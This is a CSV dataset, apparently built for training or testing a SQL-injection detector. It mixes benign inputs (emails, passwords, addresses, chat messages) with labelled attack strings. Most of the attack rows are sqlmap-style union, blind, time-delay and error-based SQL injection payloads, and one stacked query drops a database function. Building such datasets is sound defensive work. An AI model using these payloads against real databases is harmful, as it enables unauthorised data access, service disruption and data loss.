payload,label
"-7825`) WHERE 5465=5465 UNION ALL SELECT 5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465,5465#",1
scanlon@theroxyblue.ng,0
"-8070) AS JGQs WHERE 8338=8338 UNION ALL SELECT 8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338,8338-- gEHC",1
pepper1,0
-2866')) or 4491=9429#,1
K. I will sent it again,0
"-9686')) AS SRWR WHERE 5840=5840 OR ELT(6467=2674,2674)-- KWgM",1
gerardo,0
"1 where 5099 = 5099 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
"DtRW' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TUxf",1
"1"")) as swwb where 4244=4244;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"-6937' IN BOOLEAN MODE) UNION ALL SELECT 2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504,2504-- byLe",1
"-1252'))) UNION ALL SELECT 5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187,5187-- wdKR",1
Same. Wana plan a trip sometme then,0
kashef,0
420420,0
hottest,0
"-5952"") UNION ALL SELECT 3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342,3342#",1
"-6410') UNION ALL SELECT 1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217,1217#",1
"-2989"") UNION ALL SELECT 5494,5494,5494,5494,5494,5494,5494,5494,5494#",1
"-1503"")) OR ELT(5506=8337,8337) AND ((""yPCy"" LIKE ""yPCy",1
50490,0
9269450355652252,0
05248300e,0
"cbHd)) AS birA WHERE 7991=7991 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(2409=2409,1))),0x716a786a71,0x78))x))-- yOZg",1
"sqlmap/1.4.4#stable (http://sqlmap.org)' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JzTa",1
50709909s,0
johncena,0
"-5507""))) UNION ALL SELECT 8590,8590,8590,8590,8590,8590,8590#",1
qweasdzxc,0
visaroff@lecriture.ic,0
"vyHv"")) OR 4368=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) AND ((""Qifn""=""Qifn",1
"vUXo]-(SELECT 0 WHERE 3091=3091 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176707171,(SELECT (ELT(5895=5895,1))),0x716a786a71)) USING utf8))))|[vUXo",1
huc55,0
14,0
8495937407634836,0
"-7056) UNION ALL SELECT 8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176,8176#",1
"1'  )  )   )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 'dqjq' = 'dqjq",1
azuara,0
istn,0
caleta,0
08490721h,0
fuck123,0
24717,0
||(SELECT zTXz WHERE 5149=5149 OR 2703=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--,1
canfranc,0
21051991,0
TAAm WHERE 1800=1800 RLIKE (SELECT 2160 FROM (SELECT(SLEEP(5)))Zizp)-- KFLo,1
calle jose lopez tafall 192,0
"-7711)) UNION ALL SELECT 3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541,3541#",1
17255,0
02071978,0
1'|| ( select 'ussi' where 8958 = 8958,1
ruralmente,0
1503380912783621,0
"-2009%' union all select 1991,1991#",1
vacher,0
'))) OR NOT 7726=7656#,1
50562,0
"sexC"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HQYM",1
') OR 9154=(SELECT 9154 FROM PG_SLEEP(5))-- KtjS,1
"1"")) union all select null,null,null,null--",1
"TAAm AND 7343=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))# kbPl",1
-2937' OR 2992=2992 AND 'EHxF' LIKE 'EHxF,1
"sexC') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-5103"" UNION ALL SELECT 4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275,4275-- dUJA",1
1024,0
"-7582) UNION ALL SELECT 4505,4505,4505,4505,4505,4505,4505,4505,4505,4505,4505,4505,4505,4505,4505,4505,4505,4505,4505,4505,4505,4505-- HuKt",1
"vyHv""))) OR 3297=BENCHMARK(5000000,MD5(0x46555064))#",1
"-6454') UNION ALL SELECT 7507,7507,7507,7507,7507,7507,7507,7507-- fSLh",1
"1'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('ckfn' like 'ckfn",1
select case when 1802 = 7063 then 1 else null end--,1
"-9539') OR (SELECT (CASE WHEN (8124=7023) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8124) END) FROM DUAL) IS NULL AND ('ydqV'='ydqV",1
"1"" where 3434 = 3434",1
')NULLNULLNULL)%20waitfor%20delay%20'0:0:20'%20/*,1
"-5714') UNION ALL SELECT 5142,5142,5142,5142,5142,5142,5142-- Aata",1
piper,0
porquet camarillo,0
"-3134' IN BOOLEAN MODE) UNION ALL SELECT 8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421,8421#",1
raush.runyon@discoteatre.fk,0
Erm … ill pick you up at about 6.45pm. That'll give enough time to get there park and that.,0
"' OR UPDATEXML(3799,CONCAT(0x2e,0x7176707171,(SELECT (ELT(3799=3799,1))),0x716a786a71),2924) AND 'qCwm' LIKE 'qCwm",1
"https://keystrokebiometrics.xyz:443/') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QvFh",1
1769471856078209,0
comisorio,0
Sir I am waiting for your mail.,0
cardias,0
98058748l,0
hundley@evelin.com.pf,0
"-1698 UNION ALL SELECT 9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857,9857-- ujLJ",1
"vyHv') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- fGBU",1
vUXo+(SELECT CHR(122)||CHR(68)||CHR(66)||CHR(90) WHERE 6788=6788 AND 2404=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (2404=2404) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL))+,1
Crucify is c not s. You should have told me earlier.,0
down,0
21122112,0
"vyHv' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(4050=4050,1))),0x716a786a71,0x78))s), 8446744073709551610, 8446744073709551610))) OR 'VZxz'='mEJW",1
-9005 union all select 4410#,1
verney,0
"-1084"") OR MAKE_SET(6856=9933,9933) AND (""qLVW""=""qLVW",1
"TAAm"" WHERE 8069=8069 AND 4490=DBMS_PIPE.RECEIVE_MESSAGE(CHR(89)||CHR(70)||CHR(120)||CHR(109),5)-- TqRq",1
rush,0
chevelle,0
brunstin,0
nextel,0
4a2ho4a2o,0
ondara,0
cervatos de la cueza,0
"sexC UNION ALL SELECT NULL,NULL#",1
25727,0
esite,0
""" PROCEDURE ANALYSE(EXTRACTVALUE(5774,CONCAT(0x5c,0x7176707171,(SELECT (CASE WHEN (5774=5774) THEN 1 ELSE 0 END)),0x716a786a71)),1) AND ""kAYd"" LIKE ""kAYd",1
""");SELECT * FROM GENERATE_SERIES(4766,4766,CASE WHEN (4766=6148) THEN 1 ELSE 0 END) LIMIT 1--",1
"vUXo"")) AS OHUk WHERE 6974=6974 AND EXTRACTVALUE(9322,CONCAT(0x5c,0x7176707171,(SELECT (ELT(9322=9322,1))),0x716a786a71))-- wRBj",1
-3950') WHERE 4523=4523 OR 2992=2992-- APAb,1
panasoni,0
7277765230207053,0
"sqlmap/1.4.4#stable (http://sqlmap.org)`) WHERE 6549=6549 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
vadi,0
1') or 6793=(select 6793 from pg_sleep(5)) and ('dtzt' like 'dtzt,1
"DtRW"")) AND 2159=6767 AND ((""WOWn"" LIKE ""WOWn",1
82417451x,0
fragmentar,0
corcoy augu,0
"-6274')) AS fecV WHERE 5047=5047 OR 7327=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (7327=7327) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))-- rxYh",1
44251271f,0
1818,0
"))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ihZD",1
I will see in half an hour,0
9495157942989922,0
"cbHd UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QMDN",1
yolanthe,0
00041731d,0
jade,0
real de montroi,0
05631,0
Gud ni8 dear..slp well..take care..swt dreams..Muah..,0
"-5755"" UNION ALL SELECT 3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522,3522-- gHnN",1
-4722'))) OR 5447=5447-- hUzu,1
sexC`=`sexC` AND 7525 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (7525=7525) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))) AND `sexC`=`sexC,1
pelarrodrguez,0
"umbria, 143,",0
"+(SELECT CHR(116)||CHR(102)||CHR(117)||CHR(65) WHERE 9618=9618 OR 1503=DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(113)||CHR(118)||CHR(108),5))+",1
3679,0
bestard,0
"DtRW"" WHERE 6306=6306 AND 6508=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (6508=6508) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC)-- SDoF",1
themselves-ignez@powerthink.cx,0
"sexC))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- xPVP",1
"-3706"") UNION ALL SELECT 8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876,8876#",1
13679,0
"1"") and elt(1889=7397,7397) and (""kuau""=""kuau",1
"sexC')) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- GiXd",1
"calle cerrada, 94,",0
70136564l,0
"cbHd AND 1826=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- pYhP",1
colvin@freemachine.no,0
hu1garina,0
kittycat,0
4978848315399103,0
taburete,0
"""))) RLIKE (SELECT 1228 FROM (SELECT(SLEEP(5)))oiSk)#",1
jonjon,0
ostrfera,0
12111991,0
"sqlmap/1.4.4#stable (http://sqlmap.org)+(SELECT SGJR WHERE 9484=9484 AND 1969=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4))+",1
sedran,0
"sqlmap/1.4.4#stable (http://sqlmap.org)"")) AS mhAO WHERE 5397=5397 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HMas",1
bruzzese@audiosat.ar,0
"1'|| ( select 'fqoz' where 9794 = 9794 union all select null,null,null,null,null--",1
"-7636')) AS eVJi WHERE 2414=2414 OR (SELECT (CASE WHEN (4533=4533) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4533) END) FROM DUAL) IS NULL-- HyhK",1
Ha! I wouldn't say that I just didn't read anything into way u seemed. I don't like 2 be judgemental....i save that for fridays in the pub!,0
"DtRW"")) AS DhOa WHERE 8909=8909 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"vyHv' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-2066"") WHERE 4916=4916 OR 1439=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (1439=1439) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)))-- FdwI",1
"-3595') UNION ALL SELECT 6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528,6528#",1
"-7416"")) UNION ALL SELECT 6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909,6909-- qTiT",1
7427,0
comn galindez,0
1 rlike  ( select  ( case when  ( 6795 = 5898 )  then 1 else 0x28 end  )  )  -- xdkx,1
43774,0
"vyHv"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
45571,0
58193627q,0
"vyHv"")))(SELECT (CASE WHEN (6093=6093) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(6093),0),500000000),NULL) ELSE CHAR(88)||CHAR(89)||CHAR(85)||CHAR(78) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND (((""kCad""=""kCad",1
"sqlmap/1.4.4#stable (http://sqlmap.org)`) WHERE 6665=6665 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OqVR",1
g1ne136,0
Come to mahal bus stop.. &lt;DECIMAL&gt;,0
benalup-casas viejas,0
27111990,0
1957,0
acr7m6nia,0
maurino,0
"-3909'))) UNION ALL SELECT 8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012,8012-- xILq",1
50297,0
rizoide,0
"cbHd OR EXTRACTVALUE(9616,CONCAT(0x5c,0x7176707171,(SELECT (ELT(9616=9616,1))),0x716a786a71))-- PRWD",1
"-9436))) OR ELT(7698=1409,1409) AND (((4853=4853",1
7774409448573763,0
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('gfxr'='gfxr",1
zarina,0
"""))) AND 1775=CONCAT(CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113),(SELECT (CASE WHEN (1775=1775) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)) AND (((""jHrj"" LIKE ""jHrj",1
yueh.frasco@granbretana.com.hk,0
"TAAm AND 6754=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (6754=6754) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))# sPNt",1
"sqlmap/1.4.4#stable (http://sqlmap.org)') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PVYw",1
c/ sant gonal 166 9-b,0
dragon,0
91309762s,0
"1 )  where 6990 = 6990 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
vUXo AND 3587 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (3587=3587) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))-- OlKc,1
lue39,0
vinko,0
DtRW') AS uKhl WHERE 3881=3881;IF(9997=7396) SELECT 9997 ELSE DROP FUNCTION VHTP--,1
"-5657) UNION ALL SELECT 4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164,4164#",1
"1%""  )  )   )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
mccowen@esencialser.mn,0
"https://keystrokebiometrics.xyz:443/' AND 9827=CTXSYS.DRITHSX.SN(9827,(CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9827=9827) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113))) OR 'VnEw'='olga",1
' WHERE 2415=2415 OR (SELECT 5414 FROM (SELECT(SLEEP(5)))KIaO)-- bEzl,1
"cbHd'));IIF(3608=3767,1,1/0)%16",1
papageno,0
miranda,0
"1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",1
linda,0
1022,0
c/ masia 111 10-g,0
"""))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- lkEK",1
brent@ladigianni.cc,0
prosdcimo surinyac,0
06196,0
"vUXo')) AS gDfq WHERE 5748=5748 AND UPDATEXML(4167,CONCAT(0x2e,0x7176707171,(SELECT (ELT(4167=4167,1))),0x716a786a71),6048)-- dWmD",1
bigfish,0
Best msg: It's hard to be with a person when u know that one more step foward will make u fall in love.. &amp; One step back can ruin ur friendship.. good night:-) ...,0
"MAKE_SET(5538=1543,'')",1
"-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",1
"-7935"") AS BbJg WHERE 5806=5806 UNION ALL SELECT 5806,5806,5806,5806,5806,5806,5806,5806,5806,5806#",1
"TAAm"")) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(9258=9258,1))),0x716a786a71,0x78))x)) AND ((""DRPr""=""DRPr",1
""")) AND 6517=(ASCII_CHAR(113)||ASCII_CHAR(118)||ASCII_CHAR(112)||ASCII_CHAR(113)||ASCII_CHAR(113)||(SELECT CASE 6517 WHEN 6517 THEN 1 ELSE 0 END FROM RDB$DATABASE)||ASCII_CHAR(113)||ASCII_CHAR(106)||ASCII_CHAR(120)||ASCII_CHAR(106)||ASCII_CHAR(113)) AND ((""dtdo"" LIKE ""dtdo",1
"-3868 UNION ALL SELECT 6464,6464,6464,6464,6464,6464,6464,6464,6464,6464,6464-- BqVE",1
clendenning@frioelectric.web,0
-7539)) AS IoSO WHERE 6749=6749 OR 2508=3909%16,1
"OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176707171,(SELECT (ELT(4698=4698,1))),0x716a786a71)) USING utf8)))",1
"cbHd' OR 5389=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- XpKK",1
"-9990') UNION ALL SELECT 6769,6769,6769,6769,6769,6769,6769,6769,6769,6769,6769#",1
"') UNION ALL SELECT NULL,NULL#",1
7361,0
2414,0
"TAAm"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- eWLp",1
60537126e,0
"calle lujan perez 17,",0
"-3707""))) or 8571=8571--",1
keast@comodepilarse.si,0
2967806020727366,0
"-7493 UNION ALL SELECT 3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119,3119#",1
2l04a8,0
"-5522' UNION ALL SELECT 1401,1401,1401,1401,1401,1401,1401,1401,1401,1401,1401,1401,1401,1401,1401,1401,1401,1401-- vvVX",1
quek,0
"https://keystrokebiometrics.xyz:443/' IN BOOLEAN MODE) AND CHAR(90)||CHAR(112)||CHAR(84)||CHAR(109)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL)--",1
45641,0
algu chavarri,0
rinaldo,0
"c/ juan carlos onetti 4, 1?d",0
)) AS njtj WHERE 9663=9663 OR 2703=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--,1
26111,0
"-3710""))) UNION ALL SELECT 6915,6915,6915,6915,6915,6915,6915,6915,6915-- JsNY",1
1') or 6793=(select 6793 from pg_sleep(5)) and ('fupe'='fupe,1
karattup,0
clennito,0
"sexC)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zmbx",1
6435,0
josias,0
4226075197468359,0
"(UPDATEXML(2608,CONCAT(0x2e,0x7176707171,(SELECT (ELT(2608=2608,1))),0x716a786a71),6143))",1
ehninger,0
narros de matalayegua,0
"sqlmap/1.4.4#stable (http://sqlmap.org)"" AND (1104=9562)*9562-- lcgj",1
jandtegui curell,0
vUXo)) OR NOT 6679=1369-- lxnA,1
vyHv) WHERE 3502=3502 OR SLEEP(5)-- NTYE,1
"avenida de la almozara 33,",0
8623,0
cbHd))) AND 9189=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9189=9189) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AND (((7344=7344,1
95866747x,0
"cbHd"") AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(2372=2372,1))),0x716a786a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (""uOxe""=""uOxe",1
"') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YVLd",1
tiefenth,0
Good evening! this is roger. How are you?,0
sabrina,0
par4u8i67t3,0
azadonad?a,0
"-2241)) AS yuYy WHERE 4707=4707 UNION ALL SELECT 4707,4707,4707,4707,4707,4707,4707,4707,4707,4707,4707,4707#",1
26532,0
"UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",1
abadia@comercioenlacalle.er,0
di rado elejalde,0
